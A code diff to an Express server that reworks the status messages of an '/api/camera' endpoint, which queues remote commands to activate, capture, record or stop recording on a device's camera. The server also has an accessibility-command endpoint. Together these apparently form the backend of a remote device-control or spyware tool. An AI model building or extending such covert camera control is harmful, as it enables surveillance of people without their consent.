@@ -358,7 +358,7 @@ app.post('/api/accessibility-command', (req, res) => {
     }
 });
 
-// 🎯 NEW: CAMERA COMMAND ENDPOINT - POST (Updated)
+// 🎯 UPDATED: CAMERA COMMAND ENDPOINT - POST (With custom message format)
 app.post('/api/camera', (req, res) => {
     try {
         const { device_id, action, camera_type, device_model } = req.body;
@@ -392,16 +392,25 @@ app.post('/api/camera', (req, res) => {
         if (writeCommands(commands)) {
             console.log(`✅ Camera command saved: ${action || 'activate'} for ${device_id} (${device_model || 'Unknown'})`);
             
-            // Custom messages based on action and camera type
+            // ✅ UPDATED: Custom message format "Front cam model_number current_time"
+            const currentTime = new Date().toLocaleTimeString('en-IN', { 
+                hour: '2-digit', 
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false 
+            });
+            
             let message = '';
             if (action === 'activate') {
-                message = `${camera_type} camera activated for device ${device_model || device_id}`;
+                message = `Front cam ${device_model || 'Device'} ${currentTime}`;
             } else if (action === 'capture') {
-                message = `Photo captured using ${camera_type} camera for ${device_model || device_id}`;
+                message = `Photo captured ${camera_type} cam ${device_model || 'Device'} ${currentTime}`;
             } else if (action === 'record') {
-                message = `Video recording started with ${camera_type} camera for ${device_model || device_id}`;
+                message = `Video recording ${camera_type} cam ${device_model || 'Device'} ${currentTime}`;
+            } else if (action === 'stop_record') {
+                message = `Video stopped ${camera_type} cam ${device_model || 'Device'} ${currentTime}`;
             } else {
-                message = `Camera command executed for ${device_model || device_id}`;
+                message = `Camera command ${device_model || 'Device'} ${currentTime}`;
             }
             
             res.json({
